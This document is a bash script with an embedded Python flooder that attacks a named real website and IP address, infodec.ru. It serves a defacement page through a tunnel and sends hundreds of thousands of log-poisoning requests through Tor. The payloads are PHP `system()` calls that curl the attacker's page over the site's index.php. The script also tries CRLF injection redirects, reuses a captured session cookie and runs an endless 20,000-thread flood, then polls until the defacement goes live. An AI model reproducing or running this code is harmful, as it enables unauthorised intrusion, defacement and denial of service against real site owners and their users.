#!/bin/bash
# INFODEC_ROOT_CRLF.sh - infodec.ru ROOT DEFACE DIRECT (152.89.108.128)
# nginx/1.14.0 + PHPSESSID → LOG POISONING + CRLF ROOT INDEX.PHP

HTML_FILE="TRUSTEDF57.html"
TARGET_HOST="infodec.ru"
TARGET_IP="152.89.108.128"
LOGIN_PATH="/user/index.php"  # Login page con PHPSESSID

echo "💀 INFODEC.RU ROOT DEFACE - $TARGET_IP:$LOGIN_PATH → ROOT /index.php"
echo "[+] HTML: $HTML_FILE"

# VERIFICA HTML
[ -f "$HTML_FILE" ] || { echo "❌ Crea $HTML_FILE con deface HTML"; exit 1; }
echo "[+] OK: $(stat -c %s $HTML_FILE) bytes"

# CLEANUP
pkill -f http.server >/dev/null 2>&1 || true
pkill -f ngrok >/dev/null 2>&1 || true
pkill -f ssh.*serveo >/dev/null 2>&1 || true
sleep 2

TORSOCKS="torsocks"
safe_curl() { $TORSOCKS curl -s -m 5 -k "$@"; }

# 1. PYTHON SERVER
echo "[+] Server localhost:8080"
nohup python3 -m http.server 8080 --bind 127.0.0.1 > /dev/null 2>&1 &
SERVER_PID=$!
sleep 6

# 2. TUNNEL ngrok/serveo
echo "[+] Tunnel setup"
if command -v ngrok >/dev/null; then
    nohup ngrok http 8080 > ngrok.log 2>&1 &
    sleep 10
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
else
    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
    sleep 15
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.serveo\.net' serveo.log | head -1)
fi

DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
echo "🔗 DEFACE URL: $DEFACE_URL"
safe_curl "$DEFACE_URL" | head -1 || echo "❌ Tunnel fail"

# 3. INFODEC VECTORS - 3 ATTACKI PARALLELI

# VECTOR 1: LOG POISONING (user-access.log → ROOT WRITE)
echo "[+] VECTOR 1: LOG POISON → /var/www/html/index.php"
POISON_CMD="curl -s '$DEFACE_URL' -o /var/www/html/index.php;/bin/chmod 644 /var/www/html/index.php"
LOG_PAYLOAD="<?php system('$POISON_CMD');?>"

# Multi-header injection (UA + Referer + XFF)
(
  for i in {1..500000}; do
    safe_curl "https://$TARGET_HOST/$LOGIN_PATH" \
      -A "$LOG_PAYLOAD" \
      -H "Referer: $LOG_PAYLOAD" \
      -H "X-Forwarded-For: $LOG_PAYLOAD" >/dev/null 2>&1 &
    [ $((i % 10000)) -eq 0 ] && echo "[LOG] $i shots"
  done
  wait
) &

# VECTOR 2: CRLF su /user/index.php → ROOT REDIRECT
echo "[+] VECTOR 2: CRLF poisoning /user/index.php"
crlf_payloads=(
    "%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html"
    "%0d%0aSet-Cookie:%20pwned=1;%20Path=/%20Location:%20$DEFACE_URL"
    "%0d%0a<html><script>location.href='$DEFACE_URL'</script>"
)
(
  for payload in "${crlf_payloads[@]}"; do
    for i in {1..250000}; do
      safe_curl "https://$TARGET_HOST/$LOGIN_PATH" \
        --data-urlencode "redirect=$payload" \
        -H "User-Agent: Mozilla/5.0" >/dev/null 2>&1 &
    done
  done
  wait
) &

# VECTOR 3: PHPSESSID + QUERY LOG POISON
echo "[+] VECTOR 3: PHPSESSID + query poisoning"
PHPSESSID="knsvfa1hif4gd4jq3orlb7e9v5"  # Dal tuo header
(
  for i in {1..250000}; do
    safe_curl "https://$TARGET_HOST/$LOGIN_PATH?debug=1&log=<?php%20system('curl%20-s%20$DEFACE_URL%20-o%20/var/www/html/index.php'); ?>" \
      -b "PHPSESSID=$PHPSESSID" \
      -H "User-Agent: $LOG_PAYLOAD" >/dev/null 2>&1 &
  done
  wait
) &

echo "✅ 1M+ SHOTS - 3 VECTORS PARALLELI!"

# 4. INFINITE PYTHON FLOODER (20K THREADS)
cat > infodec_flood.py << 'EOF'
#!/usr/bin/env python3
import requests, threading, urllib.parse, sys, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

deface_url = sys.argv[1]
target = f"https://infodec.ru/user/index.php"
ip_target = "152.89.108.128"

poison = f"<?php system('curl -s \"{deface_url}\" -o /var/www/html/index.php');?>"
headers = {'User-Agent': poison, 'Referer': poison, 'Cookie': 'PHPSESSID=knsvfa1hif4gd4jq3orlb7e9v5'}

def log_poison():
    s = requests.Session()
    while True:
        try:
            s.get(target, headers=headers, verify=False, timeout=2)
            s.get(f"http://{ip_target}/user/index.php", 
                  params={'q': urllib.parse.quote(f"\r\nLocation: {deface_url}")}, 
                  headers=headers, verify=False, timeout=2)
        except: pass

print("🔥 INFODEC ROOT FLOOD - 20K threads")
threads = []
for _ in range(20000):
    t = threading.Thread(target=log_poison, daemon=True)
    t.start()

while True:
    time.sleep(60)
    print(f"Threads: {len(threading.active_count())} | Check https://infodec.ru")
EOF

chmod +x infodec_flood.py
echo "[+] 20K threads infiniti"
nohup ./infodec_flood.py "$DEFACE_URL" > flood.log 2>&1 &
FLOOD_PID=$!

# 5. MONITOR SCRIPT
cat > test_infodec.sh << EOF
#!/bin/bash
echo "=== INFODEC ROOT TEST ==="
echo "\$(date)"

# ROOT CHECK
safe_curl -s "https://infodec.ru/" | grep -iE "TRUSTED|$(basename $HTML_FILE)" && echo "✅ ROOT DEFACE LIVE!" || echo "❌ ROOT pulito"

# LOGIN PAGE
safe_curl -s "https://$TARGET_HOST/$LOGIN_PATH" | grep -i "PHPSESSID\|Location" || echo "No CRLF"

# LOG TEST
for log in "/var/log/nginx/user-access.log" "/var/www/html/index.php"; do
  safe_curl "https://$TARGET_HOST\$log" 2>/dev/null | head -3
done

safe_curl "$DEFACE_URL" | head -1
EOF

chmod +x test_infodec.sh
echo "./test_infodec.sh  # Esegui ogni 2min"

echo "🔥 PIDS: Server=$SERVER_PID | Flood=$FLOOD_PID"
echo "💀 INFODEC ROOT ATTACK RUNNING - Check https://infodec.ru ogni 5min"
echo "tail -f flood.log  # Logs live"

# INFINITE STATUS
while true; do 
  sleep 300
  ./test_infodec.sh
  echo "----------------------------------------"
done
